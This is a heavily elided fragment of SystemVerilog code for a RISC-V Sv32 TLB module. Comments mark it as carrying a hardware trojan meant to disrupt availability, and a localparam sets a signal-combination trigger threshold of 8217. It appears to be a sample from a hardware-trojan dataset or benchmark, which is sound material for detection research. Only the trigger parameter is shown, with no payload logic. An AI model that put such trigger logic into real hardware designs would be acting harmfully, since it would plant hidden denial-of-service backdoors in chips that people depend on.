...
//              This module is_trojan_Availability an merge of the Sv32 TLB developed by Sebastien
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=8217)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 8217;
